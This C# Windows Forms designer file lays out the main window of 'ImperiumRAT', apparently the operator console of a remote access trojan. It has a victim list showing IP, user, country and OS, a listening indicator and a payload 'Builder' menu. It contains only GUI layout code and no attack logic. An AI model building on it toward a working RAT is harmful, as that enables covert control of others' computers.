namespace ImperiumCLIENT
{
    partial class ImperiumMainForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ImperiumMainForm));
            this.LV_Connected = new System.Windows.Forms.ListView();
            this.CH_IP = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.CH_User = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.CH_Tag = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.CH_Status = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.CH_Country = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.CH_OS = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.LBL_ListeningStatus = new System.Windows.Forms.Label();
            this.MS_ImperiumRAT = new System.Windows.Forms.MenuStrip();
            this.TSMI_File = new System.Windows.Forms.ToolStripMenuItem();
            this.TSMI_Close = new System.Windows.Forms.ToolStripMenuItem();
            this.TSMI_Settings = new System.Windows.Forms.ToolStripMenuItem();
            this.TSMI_Builder = new System.Windows.Forms.ToolStripMenuItem();
            this.TSMI_About = new System.Windows.Forms.ToolStripMenuItem();
            this.CheckIfStillListeningWorker = new System.ComponentModel.BackgroundWorker();
            this.MS_ImperiumRAT.SuspendLayout();
            this.SuspendLayout();
            // 
            // LV_Connected
            // 
            this.LV_Connected.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.CH_IP,
            this.CH_User,
            this.CH_Tag,
            this.CH_Status,
            this.CH_Country,
            this.CH_OS});
            this.LV_Connected.FullRowSelect = true;
            this.LV_Connected.Location = new System.Drawing.Point(12, 31);
            this.LV_Connected.Name = "LV_Connected";
            this.LV_Connected.Size = new System.Drawing.Size(1177, 412);
            this.LV_Connected.TabIndex = 0;
            this.LV_Connected.UseCompatibleStateImageBehavior = false;
            this.LV_Connected.View = System.Windows.Forms.View.Details;
            // 
            // CH_IP
            // 
            this.CH_IP.Text = "IP Address";
            this.CH_IP.Width = 182;
            // 
            // CH_User
            // 
            this.CH_User.Text = "User";
            this.CH_User.Width = 180;
            // 
            // CH_Tag
            // 
            this.CH_Tag.DisplayIndex = 5;
            this.CH_Tag.Text = "Client Tag";
            this.CH_Tag.Width = 119;
            // 
            // CH_Status
            // 
            this.CH_Status.DisplayIndex = 2;
            this.CH_Status.Text = "Status";
            this.CH_Status.Width = 134;
            // 
            // CH_Country
            // 
            this.CH_Country.DisplayIndex = 3;
            this.CH_Country.Text = "Country";
            this.CH_Country.Width = 180;
            // 
            // CH_OS
            // 
            this.CH_OS.DisplayIndex = 4;
            this.CH_OS.Text = "Operating System";
            this.CH_OS.Width = 227;
            // 
            // LBL_ListeningStatus
            // 
            this.LBL_ListeningStatus.AutoSize = true;
            this.LBL_ListeningStatus.Location = new System.Drawing.Point(12, 446);
            this.LBL_ListeningStatus.Name = "LBL_ListeningStatus";
            this.LBL_ListeningStatus.Size = new System.Drawing.Size(103, 17);
            this.LBL_ListeningStatus.TabIndex = 1;
            this.LBL_ListeningStatus.Text = "Listening: false";
            // 
            // MS_ImperiumRAT
            // 
            this.MS_ImperiumRAT.BackColor = System.Drawing.SystemColors.Window;
            this.MS_ImperiumRAT.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.MS_ImperiumRAT.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.TSMI_File,
            this.TSMI_Settings,
            this.TSMI_Builder,
            this.TSMI_About});
            this.MS_ImperiumRAT.Location = new System.Drawing.Point(0, 0);
            this.MS_ImperiumRAT.Name = "MS_ImperiumRAT";
            this.MS_ImperiumRAT.Size = new System.Drawing.Size(1201, 28);
            this.MS_ImperiumRAT.TabIndex = 2;
            this.MS_ImperiumRAT.Text = "MS_ImperiumServer";
            // 
            // TSMI_File
            // 
            this.TSMI_File.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.TSMI_Close});
            this.TSMI_File.Name = "TSMI_File";
            this.TSMI_File.Size = new System.Drawing.Size(44, 24);
            this.TSMI_File.Text = "File";
            // 
            // TSMI_Close
            // 
            this.TSMI_Close.Image = ((System.Drawing.Image)(resources.GetObject("TSMI_Close.Image")));
            this.TSMI_Close.Name = "TSMI_Close";
            this.TSMI_Close.Size = new System.Drawing.Size(120, 26);
            this.TSMI_Close.Text = "Close";
            this.TSMI_Close.Click += new System.EventHandler(this.TSMI_Close_Click);
            // 
            // TSMI_Settings
            // 
            this.TSMI_Settings.Name = "TSMI_Settings";
            this.TSMI_Settings.Size = new System.Drawing.Size(74, 24);
            this.TSMI_Settings.Text = "Settings";
            this.TSMI_Settings.Click += new System.EventHandler(this.TSMI_Settings_Click);
            // 
            // TSMI_Builder
            // 
            this.TSMI_Builder.Name = "TSMI_Builder";
            this.TSMI_Builder.Size = new System.Drawing.Size(68, 24);
            this.TSMI_Builder.Text = "Builder";
            this.TSMI_Builder.Click += new System.EventHandler(this.TSMI_Builder_Click);
            // 
            // TSMI_About
            // 
            this.TSMI_About.Name = "TSMI_About";
            this.TSMI_About.Size = new System.Drawing.Size(62, 24);
            this.TSMI_About.Text = "About";
            this.TSMI_About.Click += new System.EventHandler(this.TSMI_About_Click);
            // 
            // CheckIfStillListeningWorker
            // 
            this.CheckIfStillListeningWorker.DoWork += new System.ComponentModel.DoWorkEventHandler(this.CheckIfStillListeningWorker_DoWork);
            // 
            // ImperiumMainForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.White;
            this.ClientSize = new System.Drawing.Size(1201, 472);
            this.Controls.Add(this.LBL_ListeningStatus);
            this.Controls.Add(this.LV_Connected);
            this.Controls.Add(this.MS_ImperiumRAT);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MainMenuStrip = this.MS_ImperiumRAT;
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(1219, 519);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(1162, 497);
            this.Name = "ImperiumMainForm";
            this.ShowIcon = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;
            this.Text = "ImperiumRAT";
            this.Load += new System.EventHandler(this.ImperiumMainForm_Load);
            this.MS_ImperiumRAT.ResumeLayout(false);
            this.MS_ImperiumRAT.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion
        private System.Windows.Forms.ListView LV_Connected;
        private System.Windows.Forms.Label LBL_ListeningStatus;
        private System.Windows.Forms.ColumnHeader CH_IP;
        private System.Windows.Forms.ColumnHeader CH_User;
        private System.Windows.Forms.ColumnHeader CH_Status;
        private System.Windows.Forms.ColumnHeader CH_Country;
        private System.Windows.Forms.ColumnHeader CH_OS;
        private System.Windows.Forms.ColumnHeader CH_Tag;
        private System.Windows.Forms.MenuStrip MS_ImperiumRAT;
        private System.Windows.Forms.ToolStripMenuItem TSMI_File;
        private System.Windows.Forms.ToolStripMenuItem TSMI_Close;
        private System.Windows.Forms.ToolStripMenuItem TSMI_Settings;
        private System.Windows.Forms.ToolStripMenuItem TSMI_Builder;
        private System.Windows.Forms.ToolStripMenuItem TSMI_About;
        private System.ComponentModel.BackgroundWorker CheckIfStillListeningWorker;
    }
}

